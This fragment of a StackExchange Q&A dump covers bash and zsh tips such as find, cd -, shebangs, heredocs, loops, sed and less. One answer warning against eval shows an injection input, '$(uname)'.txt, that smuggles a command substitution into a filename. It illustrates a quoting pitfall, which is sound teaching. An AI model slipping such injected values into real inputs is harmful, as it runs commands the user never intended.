<p>Alternatively, you can generate the list of file names with <code>find</code>. To avoid recursing into subdirectories, use <code>-type d -prune</code>. Since no action is specified for the listed image files, only the other files are moved.</p>

<pre><code>find . -name . -o -type d -prune -o \
       -name '*.jpg' -o -name '*.png' -o -name '*.bmp' -o \
       -exec mv -t targetdir/ {} +
</code></pre>

<p>(This includes dot files, unlike the shell wildcard methods.)</p>

<p>If you don't have GNU utilities, you can use an intermediate shell to get the arguments in the right order. This method works on all POSIX systems.</p>

<pre><code>find . -name . -o -type d -prune -o \
       -name '*.jpg' -o -name '*.png' -o -name '*.bmp' -o \
       -exec sh -c 'mv ""$@"" ""$0""' targetdir/ {} +
</code></pre>

<hr>

<p>In zsh, you can load the <a href=""http://zsh.sourceforge.net/Doc/Release/Zsh-Modules.html#index-mv""><code>mv</code> builtin</a>:</p>

<pre><code>setopt extended_glob
zmodload zsh/files
mv -- ^*.(jpg|png|bmp) targetdir/
</code></pre>

<p>or if you prefer to let <code>mv</code> and other names keep referring to the external commands:</p>

<pre><code>setopt extended_glob
zmodload -Fm zsh/files b:zf_\*
zf_mv -- ^*.(jpg|png|bmp) targetdir/
</code></pre>

<p>or with ksh-style globs:</p>

<pre><code>setopt ksh_glob
zmodload -Fm zsh/files b:zf_\*
zf_mv -- !(*.jpg|*.png|*.bmp) targetdir/
</code></pre>

<p>Alternatively, using GNU <code>mv</code> and <a href=""http://zsh.sourceforge.net/Doc/Release/User-Contributions.html#index-zargs""><code>zargs</code></a>:</p>

<pre><code>autoload -U zargs
setopt extended_glob
zargs -- ./^*.(jpg|png|bmp) -- mv -t targetdir/
</code></pre>
"
"What is the bash shortcut to change to the previous directory?","3284","<bash><shell><cd-command>","81","<p>The shortcut is <code>-</code></p>

<p>Try <code>cd -</code></p>

<p>If you want to use this in your prompt, you have to refer to it with <code>~-</code>.</p>

<p>See the example:</p>

<pre><code>[echox@kaffeesatz ~]$ cd /tmp
[echox@kaffeesatz tmp]$ ls
cron.iddS32  serverauth.CfIgeXuvka
[echox@kaffeesatz tmp]$ cd -
/home/echox
[echox@kaffeesatz ~]$ ls ~-
cron.iddS32  serverauth.CfIgeXuvka
</code></pre>
"
"Shell script fails: Syntax error: ""("" unexpected","45781","<bash><shell><ubuntu><shell-script>","81","<p>The script does not begin with a <a href=""http://en.wikipedia.org/wiki/Shebang_%28Unix%29"" rel=""noreferrer"">shebang</a> line, so the system executes it with <code>/bin/sh</code>. On Ubuntu, <code>/bin/sh</code> is <a href=""http://en.wikipedia.org/wiki/Debian_Almquist_shell"" rel=""noreferrer"">dash</a>, a shell designed for fast startup and execution with only standard features. When dash reaches line 68, it sees a syntax error: that parenthesis doesn't mean anything to it in context.</p>

<p>Since dash (like all other shells) is an interpreter, it won't complain until the execution reaches the problematic line. So even if the script successfully started at some point in your testing, it would have aborted once line 68 was reached.</p>

<p>The shebang line must be the very first thing in the file. Since you use bash features, the first line of the file must be <code>#!/bin/bash</code> or <code>#!/usr/bin/env bash</code>.</p>
"
"How to grep the output of cURL?","166359","<bash><command-line><curl>","81","<p>curl writes the output to stderr, so redirect that and also suppress the progress:</p>

<pre><code>curl -v --silent https://google.com/ 2&gt;&amp;1 | grep expire
</code></pre>

<p>The reason why <code>curl</code> writes the information to stderr is so you can do:<br>
<code>curl &lt;url&gt; | someprgram</code> without that information clobbering the input of <code>someprogram</code></p>
"
"how to glob every hidden file except current and parent directory","1168","<command-line><shell><bash>","80","<p>You can use the <code>GLOBIGNORE</code> variable to hide the <code>.</code> and <code>..</code> directories. This does automatically also set the <code>dotglob</code> option, so <code>*</code> now matches both hidden and non-hidden files. You can again manually unset <code>dotglob</code>, though, this then gives the behavior you want.</p>

<p>See this example:</p>

<pre><code>$ ls -a
.  ..  a  .a  ..a
$ GLOBIGNORE="".:..""
$ shopt -u dotglob
$ echo * # all (only non-hidden)
a
$ echo .* # all (only hidden)
.a ..a
</code></pre>
"
"How can we run a command stored in a variable?","444946","<bash><shell><quoting><variable>","80","<p>This has been discussed in a number of questions on unix.SE, I'll try to collect all issues I can come up with here. References at the end.</p>
<hr />
<h3>Why it fails</h3>
<p>The reason you face those problems is <a href=""https://mywiki.wooledge.org/WordSplitting"" rel=""noreferrer"">word splitting</a> and the fact that quotes expanded from variables don't act as quotes, but are just ordinary characters.</p>
<p><strong>The cases presented in the question:</strong></p>
<p>The assignment here assigns the single string <code>ls -l &quot;/tmp/test/my dir&quot;</code> to <code>abc</code>:</p>
<pre><code>$ abc='ls -l &quot;/tmp/test/my dir&quot;'
</code></pre>
<p>Below, <code>$abc</code> is split on whitespace, and <code>ls</code> gets the three arguments <code>-l</code>, <code>&quot;/tmp/test/my</code> and <code>dir&quot;</code> (with a quote at the front of the second and another at the back of the third). The option works, but the path gets incorrectly processed:</p>
<pre><code>$ $abc
ls: cannot access '&quot;/tmp/test/my': No such file or directory
ls: cannot access 'dir&quot;': No such file or directory
</code></pre>
<p>Here, the expansion is quoted, so it's kept as a single word. The shell tries to find a program literally called <code>ls -l &quot;/tmp/test/my dir&quot;</code>, spaces and quotes included.</p>
<pre><code>$ &quot;$abc&quot;
bash: ls -l &quot;/tmp/test/my dir&quot;: No such file or directory
</code></pre>
<p>And here, <code>$abc</code> is split, and only the first resulting word is taken as the argument to <code>-c</code>, so Bash just runs <code>ls</code> in the current directory. The other words are arguments to bash, and are used to fill <code>$0</code>, <code>$1</code>, etc.</p>
<pre><code>$ bash -c $abc
'my dir'
</code></pre>
<p>With <code>bash -c &quot;$abc&quot;</code>, and <code>eval &quot;$abc&quot;</code>, there's an additional shell processing step, which does make the quotes work, but <em>also causes all shell expansions to be processed again</em>, so there's a risk of accidentally running e.g. a command substitution from user-provided data, unless you're very careful about quoting.</p>
<hr />
<h3>Better ways to do it</h3>
<p>The two better ways to store a command are a) use a function instead, b) use an array variable (or the positional parameters).</p>
<p><strong>Using a function:</strong></p>
<p>Simply declare a function with the command inside, and run the function as if it were a command. Expansions in commands within the function are only processed when the command runs, not when it's defined, and you don't need to quote the individual commands.</p>
<pre><code># define it
myls() {
    ls -l &quot;/tmp/test/my dir&quot;
}

# run it
myls
</code></pre>
<p><strong>Using an array:</strong></p>
<p>Arrays allow creating multi-word variables where the individual words contain white space. Here, the individual words are stored as distinct array elements, and the <code>&quot;${array[@]}&quot;</code> expansion expands each element as separate shell words:</p>
<pre><code># define the array
mycmd=(ls -l &quot;/tmp/test/my dir&quot;)

# run the command
&quot;${mycmd[@]}&quot;
</code></pre>
<p>The syntax is slightly horrible, but arrays also allow you to build the command line piece-by-piece. For example:</p>
<pre><code>mycmd=(ls)               # initial command
if [ &quot;$want_detail&quot; = 1 ]; then
    mycmd+=(-l)          # optional flag
fi
mycmd+=(&quot;$targetdir&quot;)    # the filename

&quot;${mycmd[@]}&quot;
</code></pre>
<p>or keep parts of the command line constant and use the array fill just a part of it, like options or filenames:</p>
<pre><code>options=(-x -v)
files=(file1 &quot;file name with whitespace&quot;)
target=/somedir

transmutate &quot;${options[@]}&quot; &quot;${files[@]}&quot; &quot;$target&quot;
</code></pre>
<p>The downside of arrays is that they're not a standard feature, so plain POSIX shells (like <code>dash</code>, the default <code>/bin/sh</code> in Debian/Ubuntu) don't support them (but see below). Bash, ksh and zsh do, however, so it's likely your system has some shell that supports arrays.</p>
<p><strong>Using <code>&quot;$@&quot;</code></strong></p>
<p>In shells with no support for named arrays, one can still use the positional parameters (the pseudo-array <code>&quot;$@&quot;</code>) to hold the arguments of a command.</p>
<p>The following should be portable script bits that do the equivalent of the code bits in the previous section. The array is replaced with <code>&quot;$@&quot;</code>, the list of positional parameters.  Setting <code>&quot;$@&quot;</code> is done with <code>set</code>, and the double quotes around <code>&quot;$@&quot;</code> are important (these cause the elements of the list to be individually quoted).</p>
<p>First, simply storing a command with arguments in <code>&quot;$@&quot;</code> and running it:</p>
<pre><code>set -- ls -l &quot;/tmp/test/my dir&quot;
&quot;$@&quot;
</code></pre>
<p>Conditionally setting parts of the command line options for a command:</p>
<pre><code>set -- ls
if [ &quot;$want_detail&quot; = 1 ]; then
    set -- &quot;$@&quot; -l
fi
set -- &quot;$@&quot; &quot;$targetdir&quot;

&quot;$@&quot;
</code></pre>
<p>Only using <code>&quot;$@&quot;</code> for options and operands:</p>
<pre><code>set -- -x -v
set -- &quot;$@&quot; file1 &quot;file name with whitespace&quot;
set -- &quot;$@&quot; /somedir

transmutate &quot;$@&quot;
</code></pre>
<p>(Of course, <code>&quot;$@&quot;</code> is usually filled with the arguments to the script itself, so you'll have to save them somewhere before re-purposing <code>&quot;$@&quot;</code>.)</p>
<hr />
<h3>Be careful with <code>eval</code>!</h3>
<p>As <code>eval</code> introduces an additional level of quote and expansion processing, you need to be careful with user input.
For example, this works as long as the user doesn't type in any single quotes:</p>
<pre><code>read -r filename
cmd=&quot;ls -l '$filename'&quot;
eval &quot;$cmd&quot;;
</code></pre>
<p>But if they give the input <code>'$(uname)'.txt</code>, your script happily runs the command substitution.</p>
<p>A version with arrays is immune to that since the words are kept separate for the whole time, there's no quote or other processing for the contents of <code>filename</code>.</p>
<pre><code>read -r filename
cmd=(ls -ld -- &quot;$filename&quot;)
&quot;${cmd[@]}&quot;
</code></pre>
<hr />
<h3>References</h3>
<ul>
<li><a href=""https://mywiki.wooledge.org/WordSplitting"" rel=""noreferrer"">Word Splitting</a> in <a href=""https://mywiki.wooledge.org/BashGuide"" rel=""noreferrer"">BashGuide</a></li>
<li><a href=""http://mywiki.wooledge.org/BashFAQ/050"" rel=""noreferrer"">BashFAQ/050 or &quot;I'm trying to put a command in a variable, but the complex cases always fail!&quot;</a></li>
<li>The question <a href=""https://unix.stackexchange.com/q/131766/170373"">Why does my shell script choke on whitespace or other special characters?</a>, which discusses a number of issues related to quoting and whitespace, including storing commands.</li>
</ul>
"
"Can't indent heredoc to match code block's indentation","76481","<bash><shell><shell-script><here-document>","80","<p>You can change the here-doc operator to <code>&lt;&lt;-</code>. You can then indent both the here-doc <em>and the delimiter</em> with tabs:</p>

<pre><code>#! /bin/bash
cat &lt;&lt;-EOF
    indented
    EOF
echo Done
</code></pre>

<p>Note that <strong>you must use tabs</strong>, not spaces to indent the here-doc. This means the above example won't work copied (Stack Exchange replaces tabs with spaces). There can not be any quotes around the first <code>EOF</code> delimiter, else parameter expansion, command substitution, and arithmetic expansion are not in effect.</p>
"
"What is the purpose of the ""do"" keyword in Bash for loops?","306940","<bash><shell><for>","79","<p>Note that that syntax is inherited from the Bourne shell.</p>

<p>After the variable name, you can have either <code>in</code> to have the list of elements explicitly given, or <code>do</code>, to loop over the positional parameters.</p>

<pre><code>for i in 1 2 3
do
  echo ""$i""
done
</code></pre>

<p>Or</p>

<pre><code>set 1 2 3
for i do
  echo ""$i""
done
</code></pre>

<p>Having the <code>do</code> in both cases (even if it's not strictly  necessary in the first one) makes for a more consistent syntax. It's also consistent with the <code>while</code>/<code>until</code> loops where the <code>do</code> is necessary.</p>

<pre><code>while
  cmd1
  cmd2
do
  cmd3
  cmd4
done
</code></pre>

<p>You need the <code>do</code> to tell where the list of <em>condition</em> commands end.</p>

<p>Note that the Bourne shell did not support <code>for i; do</code>. That syntax was also not POSIX until the 2016 edition of the standard (<code>for i do</code> has always been POSIX; see <a href=""http://austingroupbugs.net/bug_view_page.php?bug_id=581"" rel=""noreferrer"">the related Austin group bug</a>).</p>

<p><code>zsh</code> has a few shorthand forms like:</p>

<pre><code>for i in 1 2 3; echo $i
for i (1 2 3) echo $i
for ((i=1;i&lt;=3;i++)) echo $i
</code></pre>

<p>Or support for more than one variable:</p>

<pre><code>for i j (1 a 2 b) echo $i $j
</code></pre>

<p>(though you can't use <code>in</code> or <code>do</code> as variable name in place of <code>j</code> above).</p>

<p>Even if rarely documented, most Bourne-like shells (Bourne, ksh, bash, zsh, not <code>ash</code> nor <code>yash</code>) also support:</p>

<pre><code>for i in 1 2 3; { echo ""$i"";}
</code></pre>

<p>The Bourne shell, <code>ksh</code> and <code>zsh</code> (but not <code>bash</code>) also support:</p>

<pre><code>for i { echo ""$i""; }
</code></pre>

<p>While <code>bash</code>, <code>ksh</code> and <code>zsh</code> (but not the Bourne shell) support:</p>

<pre><code>for i; { echo ""$i""; }
</code></pre>

<p>All (Bourne, <code>bash</code>, <code>ksh</code>, <code>zsh</code>) support:</p>

<pre><code>for i
{ echo ""$i"";}
</code></pre>

<p><code>ksh93</code>, <code>bash</code>, <code>zsh</code> support:</p>

<pre><code>for ((i=1;i&lt;=3;i++)) { echo ""$i""; }
</code></pre>
"
"How to do an if statement from the result of an executed command","52800","<bash><shell><text-processing><netstat>","78","<p>Use the bash <code>[[</code> conditional construct and prefer the <code>$(</code>&lt;command&gt;<code>)</code> command substitution convention. Additionally, <code>[[</code> prevents word splitting of variable values therefore there is no need to quote the command substitution bit..</p>

<pre><code>if [[ $(netstat -lnp | grep ':8080') = *java* ]]; then
  echo ""Found a Tomcat!""
fi
</code></pre>
"
"How can I remove duplicates in my .bash_history, preserving order?","48713","<bash><command-line><command-history><sort><uniq>","78","<h3>Sorting the history</h3>

<p>This command works like <code>sort|uniq</code>, but keeps the lines in place</p>

<pre><code>nl|sort -k 2|uniq -f 1|sort -n|cut -f 2
</code></pre>

<p>Basically, prepends to each line its number.  After <code>sort|uniq</code>-ing, all lines are sorted back according to their original order (using the line number field) and the line number field is removed from the lines. </p>

<p>This solution has the flaw that it is undefined which representative of a class of equal lines will make it in the output and therefore its position in the final output is undefined.  However, if the latest representative should be chosen you can <code>sort</code> the input by a second key:</p>

<pre><code>nl|sort -k2 -k 1,1nr|uniq -f1|sort -n|cut -f2
</code></pre>

<h3>Managing .bash_history</h3>

<p>For re-reading and writing back the history, you can use <code>history -a</code> and <code>history -w</code> respectively.</p>
"
"grep inside less?","179238","<bash><grep><logs><less>","77","<p><code>less</code> has very powerful pattern matching.  From the <a href=""http://linux.die.net/man/1/less"">man page</a>:</p>

<blockquote>
  <p><code>&amp;<i>pattern</i></code><ul>
  Display only lines which match the <code><i>pattern</i></code>;
  lines which do not match the <code><i>pattern</i></code>
  are not displayed.  If <code><i>pattern</i></code> is empty
  (if you type <code>&amp;</code> immediately followed by <kbd>ENTER</kbd>),
  any filtering is turned off, and all lines are displayed. 
  While filtering is in effect,
  an ampersand is displayed at the beginning of the prompt,
  as a reminder that some lines in the file may be hidden.</p>
  
  <p>Certain characters are special as in the <code>/</code> command<sup>&dagger;</sup>:</p>
  
  <p><code>^N</code> or <code>!</code><ul>
  Display only lines which do NOT match the <code><i>pattern</i></code>.</ul>
  <code>^R</code><ul>
      Don't interpret regular expression metacharacters;
  that is, do a simple textual comparison.</ul><br>
  ____________<br>
  <sup>&dagger;</sup> Certain characters are special
  if entered at the beginning of the <code><i>pattern</i></code>;
  they modify the type of search
  rather than become part of the <code><i>pattern</i></code>.
  </ul></p>
</blockquote>

<p>   (Of course <code>^N</code> and <code>^R</code> represent <kbd>Ctrl</kbd>+<kbd>N</kbd>
and <kbd>Ctrl</kbd>+<kbd>R</kbd>, respectively.) </p>

<p>So, for example, <code>&amp;dns</code> will display only lines that match the pattern <code>dns</code>,
and <code>&amp;!dns</code> will filter out (exclude) those lines,
displaying only lines that don't match the pattern.</p>

<p>It is noted in the description of the <code>/</code> command that</p>

<blockquote>
  <ul>The <code><i>pattern</i></code> is a regular expression,
  as recognized by the regular expression library supplied by your system.</ul>
</blockquote>

<p>So</p>

<ul>
<li><code>&amp;eth[01]</code>  will display lines containing <code>eth0</code> or <code>eth1</code></li>
<li><code>&amp;arp.*eth0</code> will display lines containing <code>arp</code> followed by <code>eth0</code></li>
<li><code>&amp;arp|dns</code>  will display lines containing <code>arp</code> or <code>dns</code></li>
</ul>

<p>And the <code>!</code> can invert any of the above. 
So the command you would want to use for the example in your question is:</p>

<pre class=""lang-none prettyprint-override""><code>&amp;!event text|something else|the other thing|foo|bar
</code></pre>

<p>Also use <code>/<i>pattern</i></code> and <code>?<i>pattern</i></code>
to search (and <code>n</code>/<code>N</code> to go to next/previous).</p>
"
"How to grep a specific line _and_ the first line of a file?","47918","<bash><command-line>","77","<h1>Good way</h1>

<p>Normally you can't do this with grep but you can use other tools. AWK was already mentioned but you can also use <code>sed</code>, like this:</p>

<pre><code>sed -e '1p' -e '/youpattern/!d'
</code></pre>

<h3>How it works:</h3>

<ol>
<li><p>Sed utility works on each line individually, running specified commands on each of them. You can have multiple commands, specifying several <code>-e</code> options. We can prepend each command with a range parameter that specifies if this command should be applied to specific line or not.</p></li>
<li><p>""1p"" is a first command. It uses <code>p</code> command which normally prints all the lines. But we prepend it with a numerical value that specifies the range it should be applied to. Here, we use <code>1</code> which means first line. If you want to print more lines, you can use <code>x,yp</code> where <code>x</code> is first line to print, <code>y</code> is last line to print. For example to print first 3 lines, you would use <code>1,3p</code></p></li>
<li><p>Next command is <code>d</code> which normally deletes all the lines from buffer. Before this command we put <code>yourpattern</code> between two <code>/</code> characters. This is the other way (first was to specify which lines as we did with <code>p</code> command) of addressing lines that the command should be running at. This means the command will only work for the lines that match <code>yourpattern</code>. Except, we use <code>!</code> character before <code>d</code> command which inverts its logic. So now it will remove all the lines that <strong>do not</strong> match specified pattern.</p></li>
<li><p>At the end, sed will print all the lines that are left in buffer. But we removed lines that do not match from the buffer so only matching lines will be printed.</p></li>
</ol>

<p>To sum up: we print 1st line, then we delete all the lines that do not match our pattern from input. Rest of the lines are printed (so only lines that <em>do</em> match the pattern).</p>

<h3>First line problem</h3>

<p>As mentioned in comments, there is a problem with this approach. If specified pattern matches also first line, it will be printed twice (once by <code>p</code> command and once because of a match). We can avoid this in two ways:</p>

<ol>
<li><p>Adding <code>1d</code> command after <code>1p</code>. As I already mentioned, <code>d</code> command deletes lines from buffer and we specify it's range by number 1, which means it will only delete 1st line. So the command would be <code>sed -e '1p' -e '1d' -e '/youpattern/!d'</code></p></li>
<li><p>Using <code>1b</code> command, instead of <code>1p</code>. It's a trick. <code>b</code> command allows us to jump to other command specified by a label (this way some commands can be omitted). But if this label is not specified (as in our example) it just jumps to the end of commands, ignoring rest of the commands for our line. So in our case, last <code>d</code> command won't remove this line from buffer.</p></li>
</ol>

<h3>Full example:</h3>

<pre><code>ps aux | sed -e '1b' -e '/syslog/!d'
</code></pre>

<h3>Using semicolon</h3>

<p>Some <code>sed</code> implementations can save you some typing by using semicolon to separate commands instead of using multiple <code>-e</code> options. So if you don't care about being portable the command would be <code>ps aux | sed '1b;/syslog/!d'</code>. It works at least in <code>GNU sed</code> and <code>busybox</code> implementations.</p>

<h1>Crazy way</h1>

<p>Here's, however, rather crazy way to do this with grep. It's definitely not optimal, I'm posting this just for learning purposes, but you may use it for example, if you don't have any other tool in your system:</p>

<pre><code>ps aux | grep -n '.*' | grep -e '\(^1:\)\|syslog'
</code></pre>

<h3>How it works</h3>

<ol>
<li><p>First, we use <code>-n</code> option to add line numbers before each line. We want to numerate all the lines we we are matching <code>.*</code> - anything, even empty line. As suggested in comments, we can also match '^', result is the same.</p></li>
<li><p>Then we are using extended regular expressions so we can use <code>\|</code> special character which works as OR. So we match if the line starts with <code>1:</code> (first line) or contains our pattern (in this case its <code>syslog</code>).</p></li>
</ol>

<h3>Line numbers problem</h3>

<p>Now the problem is, we are getting this ugly line numbers in our output. If this is a problem, we can remove them with <code>cut</code>, like this:</p>

<pre><code>ps aux | grep -n '.*' | grep -e '\(^1:\)\|syslog' | cut -d ':' -f2-
</code></pre>

<p><code>-d</code> option specifies delimiter, <code>-f</code> specifies fields (or columns) we want to print. So we want to cut each lines on every <code>:</code> character and print only 2nd and all subsequent columns. This effectively removes first column with it's delimiter and this is exactly what we need.</p>
"
"keyserver timed out when trying to add a GPG public key","75892","<bash><ubuntu><gpg>","77","<p>This is usually caused by your firewall blocking the port <code>11371</code>. You could unblock the port in your firewall. In case you don't have access to the firewall you could:</p>
<p>Force it to use port <code>80</code> instead of <code>11371</code></p>
<pre><code>    gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 94558F59
</code></pre>
<p>Alternatively</p>
<ul>
<li>Find and open the key from the key server.</li>
<li>Copy it's contents into a text file.</li>
<li>Go to System Tool &gt; Preferences &gt; Software Sources &gt; Authentication &gt; Add key, and select the text file created. <strong>Ubuntu 14.04 and later try</strong>: Software Center -&gt; Edit -&gt; Software Sources -&gt; Authentication -&gt; Import key file</li>
</ul>
"
"Script to change current directory (cd, pwd)","27139","<bash><scripting><environment-variables><cd-command>","77","<p>It is an expected behavior. The script is run in a subshell, and cannot change the parent shell working directory. Its effects are lost when it finishes.</p>
<p>To change the current shell's directory permanently you should use the <code>source</code> command, also aliased simply as <code>.</code>, which runs a script in the current shell environment instead of a sub shell.</p>
<p>The following commands are identical:</p>
<pre><code>. script
</code></pre>
<p>or</p>
<pre><code>source script
</code></pre>
"
"List subdirectories only n level deep","93323","<bash><ls>","77","<p>I'm on Fedora, and these voicepacks are in a slightly different location:</p>

<pre><code>$ ls /usr/share/festival/lib/voices/*/ -1 | grep -vE ""/usr|^$""
kal_diphone
ked_diphone
nitech_us_awb_arctic_hts
nitech_us_bdl_arctic_hts
nitech_us_clb_arctic_hts
nitech_us_jmk_arctic_hts
nitech_us_rms_arctic_hts
nitech_us_slt_arctic_hts
</code></pre>

<p>You can just modify this like so:</p>

<pre><code>$ ls /usr/share/festival/voices/*/ -1 | grep -vE ""/usr|^$""
</code></pre>

<h3>Using find</h3>

<p>Using <code>ls</code> in this manor is typically frowned upon because the output of <code>ls</code> is difficult to parse. Better to use the <code>find</code> command, like so:</p>

<pre><code>$ find /usr/share/festival/lib/voices -maxdepth 2 -mindepth 2 \
    -type d -exec basename {} \;
nitech_us_awb_arctic_hts
nitech_us_bdl_arctic_hts
nitech_us_slt_arctic_hts
nitech_us_jmk_arctic_hts
nitech_us_clb_arctic_hts
nitech_us_rms_arctic_hts
ked_diphone
kal_diphone
</code></pre>

<h3>Details of find &amp; basename</h3>

<p>This command works by producing a list of full paths to files that are exactly 2 levels deep with respect to this directory:</p>

<pre><code>/usr/share/festival/lib/voices
</code></pre>

<p>This list looks like this:</p>

<pre><code>$ find /usr/share/festival/lib/voices -maxdepth 2 -mindepth 2 
/usr/share/festival/lib/voices/us/nitech_us_awb_arctic_hts
/usr/share/festival/lib/voices/us/nitech_us_bdl_arctic_hts
/usr/share/festival/lib/voices/us/nitech_us_slt_arctic_hts
/usr/share/festival/lib/voices/us/nitech_us_jmk_arctic_hts
/usr/share/festival/lib/voices/us/nitech_us_clb_arctic_hts
/usr/share/festival/lib/voices/us/nitech_us_rms_arctic_hts
/usr/share/festival/lib/voices/english/ked_diphone
/usr/share/festival/lib/voices/english/kal_diphon
</code></pre>

<p>But we want the last part of these directories, the leaf node. So we can make use of <code>basename</code> to parse it out:</p>

<pre><code>$ basename /usr/share/festival/lib/voices/us/nitech_us_awb_arctic_hts
nitech_us_awb_arctic_hts
</code></pre>

<p>Putting it all together, we can make the <code>find</code> command pass each 2 level deep directory to the <code>basename</code> command. The notation <code>basename {}</code> is what is doing these basename conversions. Find calls it via it's <code>-exec</code> switch.</p>
"
"Is there any way to keep a command from being added to your history?","6094","<bash><security><zsh><command-history>","76","<p><strong>In ZSH</strong>:</p>
<p>First insert <code>setopt HIST_IGNORE_SPACE</code> to your <code>~/.zshrc</code>. Now after you log in again, you can prefix any commands you don't want stored in the history with a <code>space</code>. Note that (unlike bash's option of the same name) the command lingers in the internal history until the next command is entered before it vanishes, allowing you to briefly reuse or edit the line.</p>
<p>From the <a href=""http://zsh.sourceforge.net/Doc/Release/Options.html#Description-of-Options"" rel=""nofollow noreferrer"">user manual</a>, the following 3 options can be used to say that certain lines shouldn't go into the history at all:</p>
<ul>
<li><strong>HIST_IGNORE_SPACE</strong> don't store commands prefixed with a space</li>
<li><strong>HIST_NO_STORE</strong> don't store <em>history</em> (<em>fc -l</em>) command</li>
<li><strong>HIST_NO_FUNCTIONS</strong> don't store function definitions</li>
</ul>
"
"Create symlink - overwrite if one exists","207294","<bash><symlink>","76","<p>Please read <a href=""http://man7.org/linux/man-pages/man1/ln.1.html"" rel=""noreferrer"">the manual</a>.</p>

<pre><code>ln -sfn /new/target /path/to/symlink
</code></pre>

<blockquote>
  <p>$ man ln</p>
  
  <p>-n, --no-dereference<br>
  treat LINK_NAME as a normal file if it is a symbolic link to a
  directory</p>
</blockquote>
"
"What is the difference between a builtin command and one that is not?","11454","<bash><shell><utilities><shell-builtin>","75","<p>From your comments, you seem to be confused about exactly what a <em>shell</em> is.  The kernel is responsible for managing the system.  It's the part that actually loads and runs programs, accesses files, allocates memory, etc.  But the kernel has no user interface; you can only communicate with it by using another program as an intermediary.</p>

<p>A shell is a program that prints a prompt, reads a line of input from you, and then interprets it as one or more commands to manipulate files or run other programs.  Before the invention of the GUI, the shell was the primary user interface of an OS.  On MS-DOS, the shell was called <code>command.com</code> and few people ever tried to use a different one.  On Unix, however, there have long been <a href=""http://en.wikipedia.org/wiki/Unix_shell"">multiple shells</a> that users could pick from.</p>

<p>They can be divided into 3 types.  The Bourne-compatible shells use the syntax derived from the original <a href=""http://en.wikipedia.org/wiki/Bourne_shell"">Bourne shell</a>.  C shells use the syntax from the original <a href=""http://en.wikipedia.org/wiki/C_shell"">C shell</a>.  Then there are nontraditional shells that invent their own syntax, or borrow one from some programming language, and are generally much less popular than the first two types.</p>

<p>A built-in command is simply a command that the shell carries out itself, instead of interpreting it as a request to load and run some other program.  This has two main effects.  First, it's usually faster, because loading and running a program takes time.  Of course, the longer the command takes to run, the less significant the load time is compared to the overall run time (because the load time is fairly constant).</p>

<p>Secondly, a built-in command can affect the internal state of the shell. That's why commands like <code>cd</code> <em>must</em> be built-in, because an external program can't change the current directory of the shell.  Other commands, like <code>echo</code>, might be built-in for efficiency, but there's no intrinsic reason they can't be external commands.</p>

<p>Which commands are built-in depends on the shell that you're using.  You'll have to consult its documentation for a list (e.g., <code>bash</code>'s built-in commands are listed in <a href=""http://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html"">Chapter 4 of its manual</a>).  The <code>type</code> command can tell you if a command is built-in (if your shell is POSIX-compatible), because POSIX requires that <code>type</code> be a built-in.  If <code>which</code> is not a built-in in your shell, then it probably won't know about your shell's built-ins, but will just look for external programs.</p>
"
"""trap ... INT TERM EXIT"" really necessary?","57940","<bash><shell><signals><trap>","75","<p>The <a href=""http://pubs.opengroup.org/onlinepubs/000095399/utilities/trap.html"">POSIX spec</a> doesn't say much about the conditions resulting in executing the EXIT trap, only about what its environment must look like when it is executed.</p>

<p>In Busybox's ash shell, your trap-exit test does not echo 'TRAP' before exiting due to either SIGINT or SIGTERM. I would suspect there are other shells in existance that may not work that way as well.</p>

<pre><code># /tmp/test.sh &amp; sleep 1; kill -INT %1
# 
[1]+  Interrupt                  /tmp/test.sh
# 
# 
# /tmp/test.sh &amp; sleep 1; kill -TERM %1
# 
[1]+  Terminated                 /tmp/test.sh
# 
</code></pre>
"
"How can I make environment variables ""exported"" in a shell script stick around?","30189","<bash><shell-script><shell><environment-variables>","74","<p>You should source your script, with</p>

<pre><code>. ./script
</code></pre>

<p>or</p>

<pre><code>source ./script
</code></pre>
"
"In bash, is it possible to use an integer variable in the loop control of a for loop?","55392","<bash><shell><shell-script><for>","74","<p>The reason for this is the order in which things occur in bash. Brace expansion occurs <strong>before</strong> variables are expanded. In order to accomplish your goal, you need to use C-style for loop:</p>

<pre><code>upperlim=10

for ((i=0; i&lt;=upperlim; i++)); do
   echo ""$i""
done
</code></pre>
"
"For loops in zsh and bash","23227","<bash><zsh>","74","<p>Several forms of complex commands such as loops have <a href=""http://zsh.sourceforge.net/Doc/Release/Shell-Grammar.html#Alternate-Forms-For-Complex-Commands"">alternate forms</a> in zsh. These forms are mostly inspired by the <a href=""http://en.wikipedia.org/wiki/C_shell"">C shell</a>, which was fairly common when zsh was young but has now disappeared. These alternate forms act exactly like the normal forms, they're just a different syntax. They're slightly shorter, but less clear.</p>

<p>The standard form for the <code>for</code> command is <code>for x in 1 2 3; do echo $x; done</code>, and the standard form for the <code>while</code> command is <code>while test …; do somecommand; done</code>. 
Ksh, bash and zsh have an alternate form of <code>for</code>: <code>for ((i = 0; i &lt; 42; i++)); do somecommand; done</code>, which mimics the <code>for</code> loops of languages like Pascal or C, to enumerate integers. Other exotic forms that exist in zsh are specific to zsh (but often inspired by csh).</p>
"
"How many shells deep I am?","373704","<bash><shell-script><shell><vim><zsh>","74","<p>When I read your question, my first thought was <code>$SHLVL</code>. 
Then I saw that you wanted to count <code>vim</code> levels
<em>in addition to</em> shell levels. 
A simple way to do this is to define a shell function:</p>

<pre><code>vim()  { ( ((SHLVL++)); command vim  ""$@"");}
</code></pre>

<p>This will automatically and silently increment <code>SHLVL</code>
each time you type a <code>vim</code> command. 
You will need to do this for each variant of <code>vi</code>/<code>vim</code> that you ever use; e.g.,</p>

<pre><code>vi()   { ( ((SHLVL++)); command vi   ""$@"");}
view() { ( ((SHLVL++)); command view ""$@"");}
</code></pre>

<p>The outer set of parentheses creates a subshell,
so the manual change in the value of <code>SHLVL</code>
doesn’t contaminate the current (parent) shell environment. 
Of course the <code>command</code> keyword is there to prevent the functions
from calling themselves (which would result in an infinite recursion loop). 
And of course you should put these definitions
into your <code>.bashrc</code> or other shell initialization file.</p>

<hr>

<p>There’s a slight inefficiency in the above. 
In some shells (bash being one), if you say</p>

<pre><b>(</b><i>cmd<sub>1</sub></i><b>;</b> <i>cmd<sub>2</sub></i><b>;</b> …<b>;</b> <i>cmd<sub>n</sub></i><b>)</b></pre>

<p>where <code><i>cmd<sub>n</sub></i></code> is an external, executable program
(i.e., not a built-in command), the shell keeps an extra process lying around,
just to wait for <code><i>cmd<sub>n</sub></i></code> to terminate. 
This is (arguably) not necessary;
the advantages and disadvantages are debatable. 
